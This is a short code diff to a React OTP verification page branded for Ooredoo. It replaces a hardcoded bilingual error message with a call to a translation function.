@@ -8,7 +8,7 @@ export default function OtpOoredoo() {
   const [, setLocation] = useLocation();
   const search = useSearch();
   const params = new URLSearchParams(search);
-  const { language, setLanguage } = useLanguage();
+  const { language, setLanguage, t } = useLanguage();
   const sessionId = localStorage.getItem("sessionId") || "";
   const showError = params.get("error") === "true";
 
@@ -75,7 +75,7 @@ export default function OtpOoredoo() {
         <div className="content-body">
             {showError && (
               <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
-                {isArabic ? "برجاء التحقق من الرمز المرسل عبر الجوال الصحيح" : "Please check the correct code sent via mobile"}
+                {t("invalid_ooredoo_otp")}
               </div>
             )}
 <h1>{language === "ar" ? "رمز التحقق" : "Verification Code"}</h1>
